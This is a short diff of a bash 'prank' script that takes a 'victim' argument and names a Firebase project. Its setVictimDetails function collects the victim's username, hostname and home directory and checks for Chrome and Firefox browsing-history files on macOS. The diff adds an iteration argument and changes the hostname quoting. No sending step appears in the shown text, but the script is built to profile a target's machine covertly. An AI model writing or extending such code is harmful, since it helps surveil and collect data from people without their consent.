@@ -4,6 +4,7 @@
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
 victim="$1"
+rootIteration="$2"
 firebaseProject="prankproject-cb680"
 
 iterationFile="$SCRIPTDIR/firebaseTest.iteration"
@@ -29,7 +30,7 @@ function fileExists(){
 
 function setVictimDetails(){
   local userName="$USER"
-  local hostname="`hostname`"
+  local hostname=`"hostname"`
   local homedir="$HOME"
   local hasChromeHistory=`fileExists "$HOME/Library/Application Support/Google/Chrome/Default/History"`
   local hasFirefoxHistory=`fileExists "$(find $HOME'/Library/Application Support/Firefox/Profiles' | grep 'places.sqlite$')"`
